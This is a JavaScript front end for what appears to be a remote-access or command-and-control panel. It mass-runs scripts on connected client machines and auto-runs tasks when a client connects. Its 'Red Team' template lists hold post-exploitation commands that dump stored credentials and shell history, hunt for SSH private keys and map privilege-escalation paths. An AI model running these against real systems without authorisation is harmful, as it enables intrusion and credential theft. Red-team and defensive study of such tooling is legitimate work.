const clientList = document.getElementById("client-list");
const clientSearch = document.getElementById("client-search");
const osFilter = document.getElementById("os-filter");
const selectAllBtn = document.getElementById("select-all-btn");
const clearSelectionBtn = document.getElementById("clear-selection-btn");
const selectedCountSpan = document.getElementById("selected-count");
const scriptEditor = document.getElementById("script-editor");
const scriptType = document.getElementById("script-type");
const executeBtn = document.getElementById("execute-btn");
const outputContainer = document.getElementById("output-container");
const clearOutputBtn = document.getElementById("clear-output-btn");
const scriptSaveName = document.getElementById("script-save-name");
const saveScriptBtn = document.getElementById("save-script-btn");
const savedScriptsList = document.getElementById("saved-scripts-list");
const autoTaskName = document.getElementById("auto-task-name");
const autoTaskTrigger = document.getElementById("auto-task-trigger");
const autoTaskOsCheckboxes = document.querySelectorAll("input[name='auto-task-os']");
const autoTaskSaveBtn = document.getElementById("auto-task-save-btn");
const autoTaskCancelBtn = document.getElementById("auto-task-cancel-btn");
const autoTaskList = document.getElementById("auto-task-list");

let allClients = [];
let filteredClients = [];
const selectedClients = new Set();
let autoTasks = [];
let autoTaskEditingId = null;
let editorInstance = null;

const EDITOR_MODES = {
  powershell: "powershell",
  bash: "shell",
  cmd: "shell",
  python: "python",
  sh: "shell",
};

function getEditorValue() {
  if (editorInstance) return editorInstance.getValue();
  return scriptEditor?.value || "";
}

function setEditorValue(value) {
  if (editorInstance) {
    editorInstance.setValue(value);
    return;
  }
  if (scriptEditor) scriptEditor.value = value;
}

function setEditorMode(type) {
  if (!editorInstance) return;
  const mode = EDITOR_MODES[type] || "powershell";
  editorInstance.setOption("mode", mode);
}

async function checkAuth() {
  try {
    const res = await fetch("/api/auth/me");
    if (!res.ok) {
      window.location.href = "/";
      return;
    }

    const data = await res.json();
    document.getElementById("username-display").textContent = data.username;

    const roleBadge = document.getElementById("role-badge");
    const roleBadges = {
      admin: '<i class="fa-solid fa-crown mr-1"></i>Admin',
      operator: '<i class="fa-solid fa-sliders mr-1"></i>Operator',
      viewer: '<i class="fa-solid fa-eye mr-1"></i>Viewer',
    };
    if (roleBadges[data.role]) {
      roleBadge.innerHTML = roleBadges[data.role];
    } else {
      roleBadge.textContent = data.role || "";
    }

    if (data.role === "admin") {
      roleBadge.classList.add(
        "bg-purple-900/50",
        "text-purple-300",
        "border",
        "border-purple-800",
      );
    } else if (data.role === "operator") {
      roleBadge.classList.add(
        "bg-blue-900/50",
        "text-blue-300",
        "border",
        "border-blue-800",
      );
    } else {
      roleBadge.classList.add(
        "bg-slate-700",
        "text-slate-300",
        "border",
        "border-slate-600",
      );
    }

    if (data.role === "admin") {
      document.getElementById("metrics-link")?.classList.remove("hidden");
      document.getElementById("scripts-link")?.classList.remove("hidden");
      document.getElementById("build-link")?.classList.remove("hidden");
      document.getElementById("deploy-link")?.classList.remove("hidden");
      document.getElementById("users-link")?.classList.remove("hidden");
      document.getElementById("plugins-link")?.classList.remove("hidden");
    } else if (data.role === "operator") {
      document.getElementById("metrics-link")?.classList.remove("hidden");
      document.getElementById("scripts-link")?.classList.remove("hidden");
      document.getElementById("build-link")?.classList.remove("hidden");
    }

    if (data.canBuild) {
      document.getElementById("build-link")?.classList.remove("hidden");
    }

    if (data.role === "viewer") {
      alert("Access denied. Operator or Admin role required.");
      window.location.href = "/";
    }
  } catch (err) {
    console.error("Auth check failed:", err);
    window.location.href = "/";
  }
}

async function loadClients() {
  try {
    const res = await fetch("/api/clients?pageSize=10000");
    if (!res.ok) throw new Error("Failed to load clients");

    const data = await res.json();
    allClients = data.items.filter((c) => c.online);
    
    if (allClients.length === 0) {
      clientList.innerHTML = '<div class="p-4 text-center text-slate-500">No online clients available</div>';
      return;
    }

    // Populate OS filter
    const osList = new Set(allClients.map(c => c.os || "unknown"));
    osFilter.innerHTML = '<option value="all">All OS (' + allClients.length + ')</option>' +
      Array.from(osList).sort().map(os => {
        const count = allClients.filter(c => (c.os || "unknown") === os).length;
        return `<option value="${escapeHtml(os)}">${escapeHtml(os)} (${count})</option>`;
      }).join("");

    filterAndRenderClients();
  } catch (error) {
    console.error("Failed to load clients:", error);
    clientList.innerHTML = '<div class="p-4 text-center text-red-400">Error loading clients</div>';
  }
}

function filterAndRenderClients() {
  const searchTerm = clientSearch.value.toLowerCase();
  const osValue = osFilter.value;

  filteredClients = allClients.filter(c => {
    const matchesSearch = !searchTerm || 
      (c.host && c.host.toLowerCase().includes(searchTerm)) ||
      c.id.toLowerCase().includes(searchTerm) ||
      (c.os && c.os.toLowerCase().includes(searchTerm)) ||
      (c.user && c.user.toLowerCase().includes(searchTerm)) ||
      (c.nickname && c.nickname.toLowerCase().includes(searchTerm));
    
    const matchesOs = osValue === "all" || (c.os || "unknown") === osValue;
    
    return matchesSearch && matchesOs;
  });

  renderClients();
}

function renderClients() {
  if (filteredClients.length === 0) {
    clientList.innerHTML = '<div class="p-4 text-center text-slate-500">No clients match your filters</div>';
    return;
  }

  clientList.innerHTML = filteredClients.map(c => {
    const name = c.host || c.id.substring(0, 8);
    const os = c.os || "unknown";
    const isSelected = selectedClients.has(c.id);
    
    return `
      <label class="flex items-center gap-3 px-4 py-3 hover:bg-slate-800/50 cursor-pointer border-b border-slate-800 last:border-b-0" data-client-id="${escapeHtml(c.id)}">
        <input type="checkbox" class="client-checkbox w-4 h-4 rounded border-slate-600 bg-slate-700 checked:bg-emerald-600" data-id="${escapeHtml(c.id)}" ${isSelected ? 'checked' : ''}>
        <div class="flex-1 min-w-0">
          <div class="font-semibold text-slate-100 truncate">${escapeHtml(name)}</div>
          <div class="text-sm text-slate-400 flex items-center gap-2">
            <span>${escapeHtml(os)}</span>
            ${c.user ? `<span class="text-slate-500">• ${escapeHtml(c.user)}</span>` : ''}
            <span class="text-slate-600">• ${c.id.substring(0, 8)}</span>
          </div>
        </div>
        <div class="text-emerald-400 text-sm">
          <i class="fa-solid fa-circle text-xs"></i> Online
        </div>
      </label>
    `;
  }).join("");

  clientList.querySelectorAll('.client-checkbox').forEach(cb => {
    cb.addEventListener('change', handleClientToggle);
  });
  
  updateSelectedCount();
}

function handleClientToggle(e) {
  const clientId = e.target.dataset.id;
  if (e.target.checked) {
    selectedClients.add(clientId);
  } else {
    selectedClients.delete(clientId);
  }
  updateSelectedCount();
}

function updateSelectedCount() {
  selectedCountSpan.textContent = `${selectedClients.size} selected`;
  executeBtn.disabled = selectedClients.size === 0;
}

function escapeHtml(text) {
  const div = document.createElement('div');
  div.textContent = text;
  return div.innerHTML;
}

let cachedSavedScripts = [];

async function loadSavedScripts() {
  try {
    const res = await fetch("/api/saved-scripts");
    if (!res.ok) throw new Error("Failed to load saved scripts");
    const data = await res.json();
    cachedSavedScripts = Array.isArray(data.items) ? data.items : [];
  } catch (err) {
    console.error("Failed to load saved scripts:", err);
    cachedSavedScripts = [];
  }
  return cachedSavedScripts;
}

function renderSavedScripts() {
  const scripts = cachedSavedScripts.slice().sort((a, b) => b.updatedAt - a.updatedAt);

  if (scripts.length === 0) {
    savedScriptsList.innerHTML = '<div class="text-slate-500 text-sm">No saved scripts yet.</div>';
    return;
  }

  savedScriptsList.innerHTML = scripts.map((s) => {
    return `
      <div class="flex items-center justify-between gap-2 px-3 py-2 rounded-lg border border-slate-700 bg-slate-800/50">
        <div class="min-w-0">
          <div class="font-semibold text-slate-100 truncate">${escapeHtml(s.name)}</div>
          <div class="text-xs text-slate-400">${escapeHtml(s.scriptType)} • ${new Date(s.updatedAt).toLocaleString()}</div>
        </div>
        <div class="flex items-center gap-2">
          <button class="load-saved-script px-2 py-1 text-xs rounded bg-emerald-600 hover:bg-emerald-700 text-white" data-id="${escapeHtml(s.id)}">
            Load
          </button>
          <button class="delete-saved-script px-2 py-1 text-xs rounded bg-slate-700 hover:bg-slate-600 text-white" data-id="${escapeHtml(s.id)}">
            Delete
          </button>
        </div>
      </div>
    `;
  }).join("");

  savedScriptsList.querySelectorAll(".load-saved-script").forEach((btn) => {
    btn.addEventListener("click", () => {
      const id = btn.dataset.id;
      const script = cachedSavedScripts.find((s) => s.id === id);
      if (!script) return;
      setEditorValue(script.content);
      scriptType.value = script.scriptType;
      scriptSaveName.value = script.name;
      setEditorMode(script.scriptType);
      showToast("Script loaded", "success", 3000);
    });
  });

  savedScriptsList.querySelectorAll(".delete-saved-script").forEach((btn) => {
    btn.addEventListener("click", async () => {
      const id = btn.dataset.id;
      try {
        const res = await fetch(`/api/saved-scripts/${encodeURIComponent(id)}`, { method: "DELETE" });
        if (!res.ok) throw new Error("Delete failed");
        cachedSavedScripts = cachedSavedScripts.filter((s) => s.id !== id);
        renderSavedScripts();
        showToast("Saved script deleted", "info", 3000);
      } catch (err) {
        console.error("Failed to delete script:", err);
        showToast("Failed to delete script", "error", 3000);
      }
    });
  });
}

async function saveCurrentScript() {
  const name = scriptSaveName.value.trim();
  const content = getEditorValue().trim();
  const type = scriptType.value;

  if (!name) {
    showToast("Please provide a name for the script", "warning", 3000);
    return;
  }

  if (!content) {
    showToast("Script is empty", "warning", 3000);
    return;
  }

  const existing = cachedSavedScripts.find((s) => s.name.toLowerCase() === name.toLowerCase());

  if (existing) {
    const ok = confirm("A script with this name already exists. Overwrite it?");
    if (!ok) return;
  }

  try {
    const res = await fetch("/api/saved-scripts", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        id: existing ? existing.id : undefined,
        name,
        content,
        scriptType: type,
      }),
    });
    if (!res.ok) throw new Error("Save failed");
    const data = await res.json();
    if (existing) {
      const idx = cachedSavedScripts.findIndex((s) => s.id === existing.id);
      if (idx !== -1) cachedSavedScripts[idx] = data.item;
    } else {
      cachedSavedScripts.push(data.item);
    }
    renderSavedScripts();
    showToast("Script saved", "success", 3000);
  } catch (err) {
    console.error("Failed to save script:", err);
    showToast("Failed to save script", "error", 3000);
  }
}

function triggerLabel(trigger) {
  if (trigger === "on_first_connect") return "On first connect";
  if (trigger === "on_connect_once") return "On connect (once)";
  return "On connect";
}

function resetAutoTaskForm() {
  autoTaskEditingId = null;
  autoTaskName.value = "";
  autoTaskTrigger.value = "on_connect";
  autoTaskOsCheckboxes.forEach((cb) => (cb.checked = false));
  autoTaskCancelBtn.classList.add("hidden");
  autoTaskSaveBtn.innerHTML = '<i class="fa-solid fa-bolt"></i> Save Auto Task';
}

function setAutoTaskForm(task) {
  autoTaskEditingId = task.id;
  autoTaskName.value = task.name || "";
  autoTaskTrigger.value = task.trigger || "on_connect";
  scriptType.value = task.scriptType || "powershell";
  setEditorMode(scriptType.value);
  setEditorValue(task.script || "");
  const osFilter = Array.isArray(task.osFilter) ? task.osFilter : [];
  autoTaskOsCheckboxes.forEach((cb) => {
    cb.checked = osFilter.includes(cb.value);
  });
  autoTaskCancelBtn.classList.remove("hidden");
  autoTaskSaveBtn.innerHTML = '<i class="fa-solid fa-pen"></i> Update Auto Task';
}

async function loadAutoTasks() {
  if (!autoTaskList) return;
  try {
    const res = await fetch("/api/auto-scripts");
    if (!res.ok) throw new Error("Failed to load auto tasks");
    const data = await res.json();
    autoTasks = Array.isArray(data.items) ? data.items : [];
    renderAutoTasks();
  } catch (err) {
    console.error("Failed to load auto tasks:", err);
    autoTaskList.innerHTML = '<div class="text-red-400 text-sm">Error loading auto tasks</div>';
  }
}

function renderAutoTasks() {
  if (!autoTaskList) return;
  if (autoTasks.length === 0) {
    autoTaskList.innerHTML = '<div class="text-slate-500 text-sm">No auto tasks yet.</div>';
    return;
  }

  autoTaskList.innerHTML = autoTasks
    .map((task) => {
      return `
        <div class="flex items-start justify-between gap-2 px-3 py-2 rounded-lg border border-slate-700 bg-slate-800/50">
          <div class="min-w-0">
            <div class="font-semibold text-slate-100 truncate">${escapeHtml(task.name)}</div>
            <div class="text-xs text-slate-400">${escapeHtml(triggerLabel(task.trigger))} • ${escapeHtml(task.scriptType)}${Array.isArray(task.osFilter) && task.osFilter.length > 0 ? ` • ${task.osFilter.map(escapeHtml).join(", ")}` : ""}</div>
          </div>
          <div class="flex items-center gap-2">
            <label class="flex items-center gap-1 text-xs text-slate-400">
              <input type="checkbox" class="auto-task-toggle w-4 h-4" data-id="${escapeHtml(task.id)}" ${task.enabled ? "checked" : ""}>
              Enabled
            </label>
            <button class="auto-task-edit px-2 py-1 text-xs rounded bg-emerald-600 hover:bg-emerald-700 text-white" data-id="${escapeHtml(task.id)}">
              Edit
            </button>
            <button class="auto-task-delete px-2 py-1 text-xs rounded bg-slate-700 hover:bg-slate-600 text-white" data-id="${escapeHtml(task.id)}">
              Delete
            </button>
          </div>
        </div>
      `;
    })
    .join("");

  autoTaskList.querySelectorAll(".auto-task-toggle").forEach((toggle) => {
    toggle.addEventListener("change", async () => {
      const id = toggle.dataset.id;
      const enabled = toggle.checked;
      try {
        const res = await fetch(`/api/auto-scripts/${id}`,
          {
            method: "PUT",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ enabled }),
          });
        if (!res.ok) throw new Error("Update failed");
        showToast(`Auto task ${enabled ? "enabled" : "disabled"}`, "success", 2500);
        loadAutoTasks();
      } catch (err) {
        console.error("Failed to update auto task:", err);
        showToast("Failed to update auto task", "error", 3000);
        toggle.checked = !enabled;
      }
    });
  });

  autoTaskList.querySelectorAll(".auto-task-edit").forEach((btn) => {
    btn.addEventListener("click", () => {
      const id = btn.dataset.id;
      const task = autoTasks.find((t) => t.id === id);
      if (!task) return;
      setAutoTaskForm(task);
    });
  });

  autoTaskList.querySelectorAll(".auto-task-delete").forEach((btn) => {
    btn.addEventListener("click", async () => {
      const id = btn.dataset.id;
      const task = autoTasks.find((t) => t.id === id);
      const ok = confirm(`Delete auto task "${task?.name || ""}"?`);
      if (!ok) return;
      try {
        const res = await fetch(`/api/auto-scripts/${id}`, { method: "DELETE" });
        if (!res.ok) throw new Error("Delete failed");
        showToast("Auto task deleted", "info", 2500);
        if (autoTaskEditingId === id) resetAutoTaskForm();
        loadAutoTasks();
      } catch (err) {
        console.error("Failed to delete auto task:", err);
        showToast("Failed to delete auto task", "error", 3000);
      }
    });
  });
}

async function saveAutoTask() {
  if (!autoTaskName || !autoTaskTrigger || !scriptType) return;
  const name = autoTaskName.value.trim();
  const trigger = autoTaskTrigger.value;
  const scriptTypeValue = scriptType.value;
  const script = getEditorValue();
  const osFilter = Array.from(autoTaskOsCheckboxes)
    .filter((cb) => cb.checked)
    .map((cb) => cb.value);

  if (!name) {
    showToast("Please provide a task name", "warning", 3000);
    return;
  }
  if (!script.trim()) {
    showToast("Script is empty", "warning", 3000);
    return;
  }

  autoTaskSaveBtn.disabled = true;
  try {
    const payload = { name, trigger, script, scriptType: scriptTypeValue, osFilter };
    const res = await fetch(autoTaskEditingId ? `/api/auto-scripts/${autoTaskEditingId}` : "/api/auto-scripts", {
      method: autoTaskEditingId ? "PUT" : "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
    if (!res.ok) throw new Error("Save failed");
    showToast(autoTaskEditingId ? "Auto task updated" : "Auto task created", "success", 2500);
    resetAutoTaskForm();
    loadAutoTasks();
  } catch (err) {
    console.error("Failed to save auto task:", err);
    showToast("Failed to save auto task", "error", 3000);
  } finally {
    autoTaskSaveBtn.disabled = false;
  }
}

clientSearch.addEventListener("input", filterAndRenderClients);
osFilter.addEventListener("change", filterAndRenderClients);

selectAllBtn.addEventListener("click", () => {
  filteredClients.forEach(c => selectedClients.add(c.id));
  renderClients();
});

clearSelectionBtn.addEventListener("click", () => {
  selectedClients.clear();
  renderClients();
});

executeBtn.addEventListener("click", async () => {
  if (selectedClients.size === 0) {
    alert("Please select at least one client");
    return;
  }

  const script = getEditorValue().trim();
  if (!script) {
    alert("Please enter a script to execute");
    return;
  }

  executeBtn.disabled = true;
  const clientIds = Array.from(selectedClients);
  outputContainer.innerHTML = `<div class="text-blue-400">Executing script on ${clientIds.length} client(s)...</div>`;

  const results = [];
  
  for (const clientId of clientIds) {
    const client = allClients.find(c => c.id === clientId);
    const clientName = client ? (client.host || clientId.substring(0, 8)) : clientId.substring(0, 8);
    
    try {
      const res = await fetch(`/api/clients/${clientId}/command`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          action: "script_exec",
          script: script,
          scriptType: scriptType.value,
        }),
      });

      if (!res.ok) {
        results.push({ clientName, clientId, error: `HTTP error! status: ${res.status}` });
        continue;
      }

      const data = await res.json();
      if (!data.ok) {
        results.push({ clientName, clientId, error: data.error || "Unknown error" });
        continue;
      }
      
      results.push({ clientName, clientId, output: data.result || "(no output)" });
    } catch (error) {
      results.push({ clientName, clientId, error: error.message });
    }
  }
  
  outputContainer.innerHTML = results.map(r => {
    if (r.error) {
      return `<div class="mb-4 pb-4 border-b border-slate-800 last:border-b-0">
        <div class="text-emerald-400 font-semibold mb-2">━━━ ${escapeHtml(r.clientName)} (${escapeHtml(r.clientId.substring(0, 8))}) ━━━</div>
        <div class="text-red-400">Error: ${escapeHtml(r.error)}</div>
      </div>`;
    }
    return `<div class="mb-4 pb-4 border-b border-slate-800 last:border-b-0">
      <div class="text-emerald-400 font-semibold mb-2">━━━ ${escapeHtml(r.clientName)} (${escapeHtml(r.clientId.substring(0, 8))}) ━━━</div>
      <div class="text-slate-100">${escapeHtml(r.output)}</div>
    </div>`;
  }).join("");
  
  executeBtn.disabled = false;
});

clearOutputBtn.addEventListener("click", () => {
  outputContainer.innerHTML =
    '<div class="text-slate-500">No output yet. Execute a script to see results.</div>';
});

saveScriptBtn?.addEventListener("click", saveCurrentScript);
scriptSaveName?.addEventListener("keypress", (e) => {
  if (e.key === "Enter") {
    saveCurrentScript();
  }
});

autoTaskSaveBtn?.addEventListener("click", saveAutoTask);
autoTaskCancelBtn?.addEventListener("click", resetAutoTaskForm);

scriptType?.addEventListener("change", () => {
  setEditorMode(scriptType.value);
});

const TEMPLATE_CATEGORIES = [
  {
    label: "Windows",
    icon: "fa-brands fa-windows",
    color: { bg: "bg-blue-900/40", border: "border-blue-700/60", text: "text-blue-300", hover: "hover:bg-blue-800/40", item: "bg-blue-900/20 border-blue-700/40 hover:bg-blue-800/30" },
    templates: [
      { label: "System Info", desc: "Get computer information", type: "powershell", script: "Get-ComputerInfo | Select-Object CsName, WindowsVersion, OsArchitecture, CsProcessors" },
      { label: "Top Processes", desc: "Show top 10 processes by CPU", type: "powershell", script: "Get-Process | Sort-Object CPU -Descending | Select-Object -First 10 Name, CPU, WorkingSet" },
      { label: "Network Info", desc: "List network adapters and IPs", type: "powershell", script: "Get-NetIPAddress | Where-Object {$_.AddressFamily -eq 'IPv4'} | Select-Object IPAddress, InterfaceAlias" },
      { label: "AV Status Check", desc: "Query registered antivirus products", type: "powershell", script: "$av = Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntiVirusProduct -ErrorAction SilentlyContinue; if ($av) { $av | Select-Object displayName, pathToSignedProductExe, timestamp } else { Write-Output 'No AV product data returned from SecurityCenter2' }" },
      { label: "Defender Health", desc: "Show Microsoft Defender status", type: "powershell", script: "Get-MpComputerStatus | Select-Object AMServiceEnabled, AntivirusEnabled, RealTimeProtectionEnabled, AntivirusSignatureLastUpdated" },
      { label: "Running Services", desc: "List active Windows services", type: "powershell", script: "Get-Service | Where-Object {$_.Status -eq 'Running'} | Sort-Object DisplayName | Select-Object -First 30 Name, DisplayName, Status" },
    ],
  },
  {
    label: "Linux",
    icon: "fa-brands fa-linux",
    color: { bg: "bg-amber-900/40", border: "border-amber-700/60", text: "text-amber-300", hover: "hover:bg-amber-800/40", item: "bg-amber-900/20 border-amber-700/40 hover:bg-amber-800/30" },
    templates: [
      { label: "Disk Usage", desc: "Show mounted filesystem usage", type: "bash", script: "df -h" },
      { label: "System Status", desc: "Show system status (Linux)", type: "bash", script: "top -bn1 | head -20" },
      { label: "OS + Kernel Info", desc: "Show distro and kernel details", type: "bash", script: "uname -a; echo; lsb_release -a 2>/dev/null || cat /etc/os-release" },
      { label: "Top Processes", desc: "Show top CPU-consuming processes", type: "bash", script: "ps aux --sort=-%cpu | head -15" },
      { label: "Network Interfaces", desc: "List interfaces and assigned IPs", type: "bash", script: "ip addr 2>/dev/null || ifconfig" },
      { label: "Failed Services", desc: "Show failing services if available", type: "bash", script: "systemctl --failed 2>/dev/null || service --status-all 2>/dev/null" },
    ],
  },
  {
    label: "macOS",
    icon: "fa-brands fa-apple",
    color: { bg: "bg-purple-900/40", border: "border-purple-700/60", text: "text-purple-300", hover: "hover:bg-purple-800/40", item: "bg-purple-900/20 border-purple-700/40 hover:bg-purple-800/30" },
    templates: [
      { label: "System Info", desc: "Show macOS version and software details", type: "bash", script: "sw_vers; echo; system_profiler SPSoftwareDataType 2>/dev/null | head -40" },
      { label: "Top Processes", desc: "Show top CPU-consuming processes", type: "bash", script: "ps aux --sort=-%cpu | head -15" },
      { label: "Network Interfaces", desc: "List interfaces and assigned IPs", type: "bash", script: "ip addr 2>/dev/null || ifconfig" },
      { label: "Sudo Rules", desc: "Show sudo permissions for the current user", type: "bash", script: "sudo -l 2>/dev/null || echo 'No sudo access or sudo not available'" },
      { label: "SSH Keys Hunt", desc: "Locate SSH private keys and authorized_keys files", type: "bash", script: "find /home /root /Users -maxdepth 4 \\( -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' -o -name 'authorized_keys' \\) 2>/dev/null" },
    ],
  },
  {
    label: "Red Team — Windows",
    icon: "fa-solid fa-skull",
    color: { bg: "bg-red-900/40", border: "border-red-700/60", text: "text-red-300", hover: "hover:bg-red-800/40", item: "bg-red-900/20 border-red-700/40 hover:bg-red-800/30" },
    templates: [
      { label: "Whoami + Privileges", desc: "Current user identity, groups and token privileges", type: "powershell", script: "whoami /all" },
      { label: "Local Users & Admins", desc: "Enumerate local accounts and administrator group members", type: "powershell", script: "Get-LocalUser | Select-Object Name,Enabled,LastLogon | Format-Table -AutoSize; Write-Host '--- Local Admins ---'; Get-LocalGroupMember -Group Administrators | Select-Object Name,ObjectClass,PrincipalSource" },
      { label: "Defender Exclusions", desc: "Show Defender exclusion paths, processes and extensions", type: "powershell", script: "$p = Get-MpPreference; 'Exclusion Paths:'; $p.ExclusionPath; ''; 'Exclusion Processes:'; $p.ExclusionProcess; ''; 'Exclusion Extensions:'; $p.ExclusionExtension" },
      { label: "PS Language Mode", desc: "Check PowerShell CLM and script block logging policy", type: "powershell", script: "Write-Host 'Language Mode:' $ExecutionContext.SessionState.LanguageMode; Write-Host 'Script Block Logging:' (Get-ItemProperty 'HKLM:\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging' -ErrorAction SilentlyContinue).EnableScriptBlockLogging" },
      { label: "Credential Manager", desc: "List stored Windows credential manager entries", type: "powershell", script: "cmdkey /list" },
      { label: "PS Command History", desc: "Show last 50 PowerShell history entries from PSReadLine", type: "powershell", script: "Get-Content (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue | Select-Object -Last 50" },
      { label: "Scheduled Tasks (Non-MS)", desc: "List non-Microsoft scheduled tasks (persistence / privesc)", type: "powershell", script: "Get-ScheduledTask | Where-Object {$_.TaskPath -notlike '\\Microsoft*'} | Select-Object TaskName,TaskPath,State | Format-Table -AutoSize" },
      { label: "Unquoted Service Paths", desc: "Find services with unquoted paths (privilege escalation vector)", type: "powershell", script: "Get-WmiObject Win32_Service | Where-Object {$_.PathName -like '* *' -and -not $_.PathName.StartsWith([char]34)} | Select-Object Name,PathName,State | Format-List" },
    ],
  },
  {
    label: "Red Team — Linux",
    icon: "fa-solid fa-bug",
    color: { bg: "bg-rose-900/40", border: "border-rose-700/60", text: "text-rose-300", hover: "hover:bg-rose-800/40", item: "bg-rose-900/20 border-rose-700/40 hover:bg-rose-800/30" },
    templates: [
      { label: "SUID Binaries", desc: "Find SUID binaries (potential privilege escalation)", type: "bash", script: "find / -perm -4000 -type f 2>/dev/null | sort" },
      { label: "Sudo Rules", desc: "Show sudo permissions for the current user", type: "bash", script: "sudo -l 2>/dev/null || echo 'No sudo access or sudo not available'" },
      { label: "Capabilities", desc: "Find binaries with elevated Linux capabilities", type: "bash", script: "getcap -r / 2>/dev/null || echo 'getcap not available'" },
      { label: "SSH Keys Hunt", desc: "Locate SSH private keys and authorized_keys files", type: "bash", script: "find /home /root /Users -maxdepth 4 \\( -name 'id_rsa' -o -name 'id_ed25519' -o -name 'id_ecdsa' -o -name 'authorized_keys' \\) 2>/dev/null" },
      { label: "Cron Jobs", desc: "Enumerate system-wide and user cron jobs", type: "bash", script: "echo '=== /etc/crontab ==='; cat /etc/crontab 2>/dev/null; echo '=== /etc/cron.d ==='; ls /etc/cron.d/ 2>/dev/null && cat /etc/cron.d/* 2>/dev/null; echo '=== User Crontabs ==='; ls /var/spool/cron/crontabs/ 2>/dev/null" },
    ],
  },
];

function renderTemplatePalette() {
  const palette = document.getElementById("template-palette");
  const searchInput = document.getElementById("template-search");
  if (!palette) return;

  function render(term) {
    palette.innerHTML = "";
    for (const cat of TEMPLATE_CATEGORIES) {
      const c = cat.color;
      const filtered = term
        ? cat.templates.filter(
            (t) =>
              t.label.toLowerCase().includes(term) ||
              t.desc.toLowerCase().includes(term),
          )
        : cat.templates;
      if (term && filtered.length === 0) continue;

      const section = document.createElement("div");
      section.className = "mb-1";

      const header = document.createElement("button");
      header.className = `w-full flex items-center gap-2 px-3 py-2 rounded-lg ${c.bg} ${c.border} border text-sm font-semibold ${c.text} ${c.hover} transition-colors`;
      header.innerHTML = `<i class="${cat.icon}"></i> ${escapeHtml(cat.label)} <span class="ml-auto text-xs opacity-60">${filtered.length}</span>`;
      header.addEventListener("click", () => {
        list.classList.toggle("hidden");
      });
      section.appendChild(header);

      const list = document.createElement("div");
      list.className = `flex flex-col gap-1 mt-1 pl-2${term ? "" : " hidden"}`;

      for (const tmpl of filtered) {
        const item = document.createElement("button");
        item.className = `w-full text-left flex items-start gap-2 px-3 py-2 rounded-lg border ${c.item} transition-colors`;
        item.innerHTML = `<div class="min-w-0"><div class="text-sm font-medium ${c.text} truncate">${escapeHtml(tmpl.label)}</div><div class="text-xs text-slate-500 truncate">${escapeHtml(tmpl.desc)}</div></div>`;
        item.addEventListener("click", () => {
          setEditorValue(tmpl.script);
          scriptType.value = tmpl.type;
          setEditorMode(tmpl.type);
        });
        list.appendChild(item);
      }

      section.appendChild(list);
      palette.appendChild(section);
    }
  }

  render("");

  if (searchInput) {
    searchInput.addEventListener("input", () => {
      const term = searchInput.value.toLowerCase().trim();
      render(term);
      if (term) {
        palette.querySelectorAll(".flex.flex-col.gap-1").forEach((l) => l.classList.remove("hidden"));
      }
    });
  }
}

function applyContextMenuParams() {
  const params = new URLSearchParams(window.location.search);
  const clientId = params.get("clientId");
  const scriptId = params.get("scriptId");
  if (!clientId && !scriptId) return;

  if (clientId) {
    const found = allClients.find((c) => c.id === clientId);
    if (found) {
      selectedClients.clear();
      selectedClients.add(clientId);
      renderClients();
    } else {
      showToast(`Client ${clientId.substring(0, 8)} is not online`, "warning", 4000);
    }
  }

  if (scriptId) {
    const script = cachedSavedScripts.find((s) => s.id === scriptId);
    if (script) {
      setEditorValue(script.content);
      scriptType.value = script.scriptType;
      scriptSaveName.value = script.name;
      setEditorMode(script.scriptType);
      showToast(`Loaded "${script.name}" — ready to run`, "success", 3000);
    } else {
      showToast("Saved script not found", "error", 4000);
    }
  }
}

checkAuth();
Promise.all([
  loadClients(),
  loadSavedScripts().then(() => renderSavedScripts()),
]).then(applyContextMenuParams);
loadAutoTasks();
renderTemplatePalette();

if (window.CodeMirror && scriptEditor) {
  editorInstance = window.CodeMirror.fromTextArea(scriptEditor, {
    lineNumbers: true,
    mode: EDITOR_MODES[scriptType?.value || "powershell"] || "powershell",
    theme: "material-darker",
    indentUnit: 2,
    tabSize: 2,
    lineWrapping: true,
  });
  editorInstance.setSize(null, "100%");
  window._vbCodeMirror = editorInstance;
}

const modeToggleCode = document.getElementById("mode-toggle-code");
const modeToggleVisual = document.getElementById("mode-toggle-visual");
const codeEditorSection = document.getElementById("code-editor-section");
const visualBuilderSection = document.getElementById("visual-builder-section");
const rightColumn = codeEditorSection?.parentElement?.querySelector(".lg\\:col-span-1");
let visualBuilderInited = false;

function setMode(mode) {
  if (mode === "visual") {
    codeEditorSection?.classList.add("hidden");
    if (rightColumn) rightColumn.classList.add("hidden");
    visualBuilderSection?.classList.remove("hidden");
    modeToggleVisual.className = "flex-1 flex items-center justify-center gap-2 px-4 py-2 rounded-lg font-semibold text-sm transition-colors bg-emerald-600 text-white";
    modeToggleCode.className = "flex-1 flex items-center justify-center gap-2 px-4 py-2 rounded-lg font-semibold text-sm transition-colors bg-slate-800 text-slate-300 hover:bg-slate-700";
    if (!visualBuilderInited) {
      import("/assets/visual-builder.js").then((mod) => {
        const container = document.getElementById("visual-builder-container");
        if (container) mod.initVisualBuilder(container);
        visualBuilderInited = true;
      });
    }
  } else {
    codeEditorSection?.classList.remove("hidden");
    if (rightColumn) rightColumn.classList.remove("hidden");
    visualBuilderSection?.classList.add("hidden");
    modeToggleCode.className = "flex-1 flex items-center justify-center gap-2 px-4 py-2 rounded-lg font-semibold text-sm transition-colors bg-emerald-600 text-white";
    modeToggleVisual.className = "flex-1 flex items-center justify-center gap-2 px-4 py-2 rounded-lg font-semibold text-sm transition-colors bg-slate-800 text-slate-300 hover:bg-slate-700";
    if (editorInstance) editorInstance.refresh();
  }
}

modeToggleCode?.addEventListener("click", () => setMode("code"));
modeToggleVisual?.addEventListener("click", () => setMode("visual"));
